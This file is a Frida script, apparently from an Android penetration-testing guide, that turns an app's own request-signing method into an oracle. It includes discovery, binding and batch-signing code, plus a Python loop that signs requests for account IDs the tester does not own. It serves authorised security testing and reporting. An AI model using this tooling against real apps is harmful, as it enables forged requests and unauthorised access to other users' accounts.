// scripts/sign-oracle.js — turn an app's own request-signing routine into an oracle.
//
// WHAT IT DOES
//   Finds the method an app uses to sign its API requests, then exposes it over
//   `rpc.exports` so you can sign arbitrary payloads from your host machine.
//
//   You never learn the algorithm. You never extract the key. You call the app's
//   own code and it hands you a valid signature. That is the whole idea, and it
//   is why this is the single most persuasive artefact you can attach to a
//   report about client-side request signing.
//
// WHY THIS MATTERS MORE THAN "THE ALGORITHM CAN BE REVERSED"
//   Those two sentences describe very different risks:
//
//     "The request signing algorithm can be reverse engineered."
//         -> sounds like weeks of work for a skilled attacker. Easy to defer.
//
//     "Using the app's own signing routine, invoked through instrumentation, we
//      generated valid signed requests for arbitrary account identifiers,
//      without reimplementing any cryptography."
//         -> sounds like an afternoon. Correctly so.
//
//   The second is what this script demonstrates. An attacker does not have to
//   understand HMAC, or find the key, or defeat the KeyStore. They only have to
//   reach the method. See ../README.md section 5.1.
//
// HOW TO RUN
//   1. Discover candidates:
//        frida -U -f com.target.app --no-pause -l sign-oracle.js
//        # then in the REPL:
//        rpc.exports.discover()
//
//   2. Bind the one that looks right, and sign something:
//        rpc.exports.bind("com.target.app.net.Signer", "sign")
//        rpc.exports.sign(["/v1/account/12345", "GET"])
//
//   3. Or drive it from Python, which is where this becomes an attack:
//
//        import frida, sys
//        session = frida.get_usb_device().attach("com.target.app")
//        script  = session.create_script(open("sign-oracle.js").read())
//        script.load()
//        api = script.exports_sync
//        print(api.discover())
//        api.bind("com.target.app.net.Signer", "sign")
//        for account in range(1000, 1010):
//            print(account, api.sign(["/v1/account/%d" % account, "GET"]))
//
//   The loop is the finding. Ten signatures for ten accounts the tester does not
//   own, produced without touching the cryptography.
//
// REQUIREMENTS
//   frida-server running on the device, matching your frida-tools version.
//   Root, or a repackaged debuggable build with frida-gadget. See ../README.md
//   section 2 for getting a working setup, and section 6 for what to do when the
//   app fights back.
//
// WHAT THIS WILL NOT TELL YOU
//   - Whether the SERVER actually validates the signature. A valid signature the
//     server ignores is a different (usually worse) finding. Always send a
//     deliberately WRONG signature too and confirm it is rejected — otherwise you
//     have proven nothing about the control.
//   - Whether the signature covers what it should. A routine that signs only the
//     path while the body is attacker-controlled is a finding on its own. Sign
//     two payloads differing only in the body and compare.
//   - Whether the key is extractable. It usually is not, and it does not matter —
//     that is the point. If the key lives in the KeyStore you still cannot export
//     it, and you still get valid signatures. See ../../49-KeyStore/README.md for
//     why "the key cannot be extracted" is not the same as "the key cannot be
//     used".
//   - Anything about native signing routines that are never surfaced to Java.
//     `discover()` walks the Java heap and loaded classes only. If nothing turns
//     up, the routine is probably in a `.so`; use ../scripts/native-tracer.js and
//     ../../57-Ghidra/README.md instead.
//
// SAFETY
//   Only run this against an application you own or are explicitly authorised to
//   test. Generating signed requests for account identifiers you do not control
//   is unauthorised access in most jurisdictions, even in a test environment, and
//   even when the app made it easy. See ../../00-Introduction/README.md.

'use strict';

// ---------------------------------------------------------------- configuration

// Method names worth looking at. Deliberately broad: the cost of a false
// positive is one glance, the cost of a false negative is missing the finding.
var NAME_HINTS = [
    'sign', 'signature', 'hmac', 'mac', 'digest', 'hash', 'checksum',
    'token', 'auth', 'nonce', 'seal', 'stamp', 'certify', 'verify'
];

// Classes we never want to report: signing the JDK's own MessageDigest is not
// the app's routine, and enumerating framework classes buries the real hit.
var CLASS_SKIP = [
    'java.', 'javax.', 'android.', 'androidx.', 'kotlin.', 'kotlinx.',
    'dalvik.', 'libcore.', 'sun.', 'com.android.', 'com.google.android.gms.',
    'org.json.', 'okio.', 'okhttp3.internal.'
];

// Types a signing routine plausibly consumes or produces.
var INTERESTING_TYPES = [
    'java.lang.String', 'byte[]', '[B', 'java.util.Map', 'okhttp3.Request'
];

var bound = null;   // { className, methodName, overloadIndex }

// ---------------------------------------------------------------- helpers

function log(msg) {
    console.log('[sign-oracle] ' + msg);
}

function isAppClass(name) {
    for (var i = 0; i < CLASS_SKIP.length; i++) {
        if (name.indexOf(CLASS_SKIP[i]) === 0) return false;
    }
    return true;
}

function looksLikeSigner(methodName) {
    var lower = methodName.toLowerCase();
    for (var i = 0; i < NAME_HINTS.length; i++) {
        if (lower.indexOf(NAME_HINTS[i]) !== -1) return true;
    }
    return false;
}

function interestingType(t) {
    for (var i = 0; i < INTERESTING_TYPES.length; i++) {
        if (t === INTERESTING_TYPES[i]) return true;
    }
    return false;
}

/**
 * Run fn inside Java.perform and settle a Promise with its result.
 *
 * Every export has to do this. An rpc.exports function that touches Java
 * directly will work exactly once, on whichever thread happened to call it, and
 * then start throwing "not attached to Java VM" in ways that look like the
 * script is broken rather than the caller.
 */
function inJava(fn) {
    return new Promise(function (resolve, reject) {
        try {
            Java.perform(function () {
                try { resolve(fn()); }
                catch (e) { reject('' + e); }
            });
        } catch (e) {
            reject('' + e);
        }
    });
}

// ---------------------------------------------------------------- discovery

/**
 * Rank a method. Higher is more likely to be the request signer.
 *
 * The ranking matters because a real app yields dozens of name matches and you
 * want the interesting three at the top, not buried under every `hashCode`.
 */
function score(className, m) {
    var s = 0;
    var lower = m.name.toLowerCase();

    if (lower.indexOf('sign') !== -1) s += 5;
    if (lower.indexOf('hmac') !== -1) s += 5;
    if (lower === 'hashcode' || lower === 'equals') s -= 100;   // noise, always
    if (lower.indexOf('verify') !== -1) s += 1;                 // the other side

    // A signer takes something and gives something back. A void method that
    // takes nothing is not it.
    if (m.returnType === 'java.lang.String' || m.returnType === 'byte[]') s += 3;
    if (m.returnType === 'void') s -= 5;
    if (m.argTypes.length === 0) s -= 3;

    for (var i = 0; i < m.argTypes.length; i++) {
        if (interestingType(m.argTypes[i])) s += 2;
    }

    // Classes named for networking are where signing usually lives.
    var cl = className.toLowerCase();
    if (cl.indexOf('sign') !== -1 || cl.indexOf('auth') !== -1) s += 3;
    if (cl.indexOf('http') !== -1 || cl.indexOf('api') !== -1 ||
        cl.indexOf('net') !== -1 || cl.indexOf('interceptor') !== -1) s += 2;
    if (cl.indexOf('crypt') !== -1 || cl.indexOf('security') !== -1) s += 2;

    return s;
}

function describeMethods(className) {
    var out = [];
    var handle;
    try { handle = Java.use(className); }
    catch (e) { return out; }

    var methods;
    try { methods = handle.class.getDeclaredMethods(); }
    catch (e) { return out; }

    for (var i = 0; i < methods.length; i++) {
        var m = methods[i];
        var name;
        try { name = m.getName(); } catch (e) { continue; }
        if (!looksLikeSigner(name)) continue;

        var argTypes = [];
        try {
            var params = m.getParameterTypes();
            for (var p = 0; p < params.length; p++) argTypes.push(params[p].getName());
        } catch (e) { /* keep what we have */ }

        var returnType = 'unknown';
        try { returnType = m.getReturnType().getName(); } catch (e) { }

        var isStatic = false;
        try {
            var Modifier = Java.use('java.lang.reflect.Modifier');
            isStatic = Modifier.isStatic(m.getModifiers());
        } catch (e) { }

        out.push({
            name: name,
            argTypes: argTypes,
            returnType: returnType,
            isStatic: isStatic
        });
    }
    return out;
}

// ---------------------------------------------------------------- signing

/**
 * Invoke the bound method with `args`. Must be called from inside Java.perform.
 *
 * Both `sign` and `signMany` route through here so a batch cannot silently
 * behave differently from a single call.
 */
function doSign(args) {
    if (!bound) throw new Error('nothing bound — call bind(className, methodName) first');

    var handle = Java.use(bound.className);
    var target = handle[bound.methodName];
    var overload = target.overloads[bound.overloadIndex];
    var callArgs = args || [];
    var argTypeNames = overload.argumentTypes.map(function (a) { return a.className; });

    var isStatic = false;
    try {
        var Modifier = Java.use('java.lang.reflect.Modifier');
        var declared = handle.class.getDeclaredMethods();
        for (var i = 0; i < declared.length; i++) {
            if (declared[i].getName() === bound.methodName) {
                isStatic = Modifier.isStatic(declared[i].getModifiers());
                break;
            }
        }
    } catch (e) { /* fall through to the instance path */ }

    if (isStatic) {
        return { result: '' + overload.apply(null, callArgs), via: 'static' };
    }

    // Prefer a live instance off the heap: a signer usually depends on state
    // established during login, so a freshly built object signs with the wrong
    // key or throws — and both look like the script failing rather than the
    // object being wrong.
    var instance = null;
    Java.choose(bound.className, {
        onMatch: function (obj) { instance = obj; return 'stop'; },
        onComplete: function () { }
    });

    if (instance !== null) {
        var m = instance[bound.methodName].overload.apply(
            instance[bound.methodName], argTypeNames);
        return { result: '' + m.apply(instance, callArgs), via: 'live instance' };
    }

    try {
        var fresh = handle.$new();
        var fm = fresh[bound.methodName].overload.apply(
            fresh[bound.methodName], argTypeNames);
        return {
            result: '' + fm.apply(fresh, callArgs),
            via: 'freshly constructed instance',
            warning: 'No live instance was on the heap, so this object was constructed from ' +
                     'scratch. If the signer depends on state established at login, this ' +
                     'signature is WRONG. Exercise the app until a real instance exists, then ' +
                     'sign again and compare.'
        };
    } catch (e) {
        throw new Error('no live instance and could not construct one: ' + e +
                        '. Drive the app to the screen that signs a request, then retry.');
    }
}

// ---------------------------------------------------------------- exports

rpc.exports = {

    /**
     * List plausible signing methods, best first.
     *
     * Optionally pass a substring to narrow the class search, which you will
     * want on any real app: discover("com.target") is seconds, discover() over
     * every loaded class can take a while.
     */
    discover: function (filter) {
        return inJava(function () {
            var results = [];
            var seen = {};
            var classes = Java.enumerateLoadedClassesSync();

            for (var i = 0; i < classes.length; i++) {
                var cn = classes[i];
                if (seen[cn]) continue;
                seen[cn] = true;
                if (!isAppClass(cn)) continue;
                if (filter && cn.indexOf(filter) === -1) continue;

                var methods = describeMethods(cn);
                for (var j = 0; j < methods.length; j++) {
                    var s = score(cn, methods[j]);
                    if (s <= 0) continue;
                    results.push({
                        score: s,
                        className: cn,
                        method: methods[j].name,
                        args: methods[j].argTypes,
                        returns: methods[j].returnType,
                        isStatic: methods[j].isStatic
                    });
                }
            }

            results.sort(function (a, b) { return b.score - a.score; });
            log('discover: ' + results.length + ' candidate(s)' +
                (filter ? ' matching "' + filter + '"' : ''));
            return results.slice(0, 40);
        });
    },

    /**
     * Pin one method as the oracle.
     *
     * overloadIndex selects among overloads; call `overloads()` first if bind
     * reports more than one.
     */
    bind: function (className, methodName, overloadIndex) {
        return inJava(function () {
            var handle = Java.use(className);
            var target = handle[methodName];
            if (!target) throw new Error('no method ' + methodName + ' on ' + className);

            var count = target.overloads ? target.overloads.length : 1;
            var idx = (overloadIndex === undefined || overloadIndex === null) ? 0 : overloadIndex;
            if (idx >= count) throw new Error('overload ' + idx + ' of ' + count + ' does not exist');

            bound = { className: className, methodName: methodName, overloadIndex: idx };
            var sig = target.overloads[idx];
            log('bound ' + className + '.' + methodName +
                ' overload ' + idx + ' of ' + count +
                '  args=' + JSON.stringify(sig.argumentTypes.map(function (a) { return a.className; })));
            return {
                bound: bound,
                overloadCount: count,
                argumentTypes: sig.argumentTypes.map(function (a) { return a.className; }),
                returnType: sig.returnType.className
            };
        });
    },

    /** Show every overload of a method, so you can pick the right index. */
    overloads: function (className, methodName) {
        return inJava(function () {
            var target = Java.use(className)[methodName];
            if (!target) throw new Error('no method ' + methodName + ' on ' + className);
            return target.overloads.map(function (o, i) {
                return {
                    index: i,
                    args: o.argumentTypes.map(function (a) { return a.className; }),
                    returns: o.returnType.className
                };
            });
        });
    },

    /**
     * Sign one payload with the bound method. `args` is an array matching the
     * method's parameters.
     *
     * For an instance method this searches the heap for a live instance rather
     * than constructing one, because a signer usually depends on state set up
     * during login — a freshly constructed object signs with the wrong key, or
     * throws, and both look like the script failing.
     */
    sign: function (args) {
        return inJava(function () { return doSign(args); });
    },

    /**
     * Sign many payloads in one call.
     *
     * This is the export that turns a curiosity into a finding: one call
     * produces valid signatures for a list of identifiers the tester does not
     * own. Include the output verbatim in the report.
     */
    signMany: function (payloads) {
        return inJava(function () {
            if (!bound) throw new Error('nothing bound — call bind(className, methodName) first');
            var out = [];
            for (var i = 0; i < payloads.length; i++) {
                var args = Array.isArray(payloads[i]) ? payloads[i] : [payloads[i]];
                try {
                    var r = doSign(args);
                    out.push({
                        input: payloads[i],
                        ok: true,
                        output: r.result,
                        via: r.via,
                        warning: r.warning
                    });
                } catch (e) {
                    // Keep going: one bad payload should not cost you the batch.
                    out.push({ input: payloads[i], ok: false, error: '' + e });
                }
            }
            log('signMany: ' + out.filter(function (r) { return r.ok; }).length +
                '/' + out.length + ' signed');
            return out;
        });
    },

    /** What is currently bound. */
    status: function () {
        return inJava(function () {
            return {
                bound: bound,
                note: bound
                    ? 'Ready. Remember to also send a deliberately wrong signature and confirm ' +
                      'the server rejects it — otherwise you have not shown the control works.'
                    : 'Nothing bound. Call discover() then bind().'
            };
        });
    }
};

Java.perform(function () {
    log('loaded. Call rpc.exports.discover("com.your.package") to begin.');
    log('Read the header before reporting anything: a valid signature only');
    log('matters if the server rejects an invalid one.');
});
